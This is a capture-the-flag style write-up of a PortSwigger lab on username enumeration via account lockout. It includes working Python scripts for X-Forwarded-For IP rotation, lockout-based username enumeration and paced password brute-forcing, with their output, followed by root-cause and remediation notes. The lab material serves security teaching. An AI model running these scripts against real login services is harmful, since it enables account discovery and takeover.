# Username Enumeration via Account Lockout, with Bypass of Anti-Bruteforce Controls

**Bug class:** Authentication side-channel, insufficient anti-bruteforce defense
**Impact:** Account discovery and full account takeover despite a lockout intended to prevent it
**Platform:** PortSwigger Web Security Academy

## Target

A login form with an account lockout mechanism. After several failed authentication attempts against a single username, the account is temporarily locked.

## Vulnerability

The lockout creates a side-channel. The application responds differently to repeated failed logins depending on whether the username exists, because only existing accounts can be locked. An unauthenticated attacker can enumerate valid usernames by triggering and observing lockout behavior.

The lockout is keyed on the username, not the client. It protects accounts but does not throttle attackers, so once a valid username is identified the lockout is also bypassable for password brute-forcing by pacing requests below the threshold.

## Exploitation

### Step 1: Rule out IP-based throttling

First hypothesis: the application throttled by IP and rotating `X-Forwarded-For` would bypass it. A script rotated source IPs across a username wordlist:

```python
random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
response = requests.post(url,
    data={"username": name, "password": "x" * 40},
    headers={"X-Forwarded-For": random_ip})
```

Response times did not vary by username and the application appeared to ignore `X-Forwarded-For` for rate-limiting. This ruled out IP-based throttling and pointed at username-keyed lockout instead.

### Step 2: Use lockout as an enumeration oracle

If lockout is keyed on the username, six failed logins against a username should produce one of two outcomes. Non-existent username: every response indicates invalid credentials. Existing username: the response after the threshold changes to indicate the account is locked.

The differential response is the oracle.

```python
import requests

URL = "https://TARGET.web-security-academy.net/login"
BAD_PASSWORD = "x" * 40

with open("users.txt") as f:
    for username in (line.strip() for line in f):
        for _ in range(6):
            response = requests.post(URL, data={
                "username": username,
                "password": BAD_PASSWORD,
            })
        if "Invalid username or password." not in response.text:
            print(f"[+] Valid username: {username}")
```

Result against the candidate wordlist:

```
[+] Valid username: atlas
```

### Step 3: Brute-force the password while pacing around the lockout

With `atlas` identified, the same lockout now stands in the way of a password attack. Two options:

- Parallelize with Burp Intruder, accepting that some sessions hit lockout while others continue.
- Serialize and pace requests below the threshold, sleeping through the lockout window when triggered.

The serial approach was selected. Lockout window: ~60 seconds. Threshold: 3 failed attempts. The script tries 3 passwords per cycle, detects lockout, sleeps 61 seconds, and retries the same password to confirm the cycle has reset.

```python
import time
import requests

URL = "https://TARGET.web-security-academy.net/login"
USERNAME = "atlas"

with open("passwords.txt") as f:
    for password in (line.strip() for line in f):
        while True:
            response = requests.post(URL, data={
                "username": USERNAME,
                "password": password,
            })
            if "too many" in response.text.lower():
                print(f"[*] Lockout triggered, sleeping 61s")
                time.sleep(61)
                continue
            if "Invalid username or password." not in response.text:
                print(f"[+] Password found: {password}")
                exit()
            print(f"[-] {password}")
            break
```

Output:

```
[-] letmein
[-] shadow
[-] master
[*] Lockout triggered, sleeping 61s
[-] 666666
...
[-] jessica
[+] Password found: pepper
```

### Step 4: Account takeover

Logged in as `atlas` with the recovered password.

## Reasoning notes

**On serial pacing over parallel intruder.** Burp Intruder would have been faster by running concurrent sessions against the per-account lockout. Trade-off: more network noise and a larger detection footprint. Neither mattered for a lab, but the same choice on a real engagement turns on whether stealth or speed is the constraint.

**On the X-Forwarded-For dead end.** The attempt assumed the application would track clients by source IP and could be bypassed by spoofing the header. It does not honor that header here. The dead end ruled out a whole class of bypass and pointed at the account-keyed mechanism that was the actual control.

## Root cause

Per-account lockout with response content that differs between locked-account and unknown-account states. The mechanism conflates two goals: making brute force expensive, and protecting individual accounts. Keying on username protects accounts but does not throttle the attacker, and it leaks username existence as a side effect.

## Remediation

- **Return identical responses for locked accounts and invalid usernames.** The differential response is what creates the oracle.
- **Combine per-account lockout with per-client rate limiting.** Account-keyed lockout alone protects accounts without throttling attackers.
- **Use CAPTCHA or proof-of-work after a small number of failures.** Raises automation cost without creating an enumeration oracle.
- **Alert on high-volume failed-login patterns.** Lockout is one control, not the whole defense.

## References

- [PortSwigger: Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
- [OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST SP 800-63B §5.2.2: Rate-Limiting (Throttling)](https://pages.nist.gov/800-63-3/sp800-63b.html#522-rate-limiting-throttling)
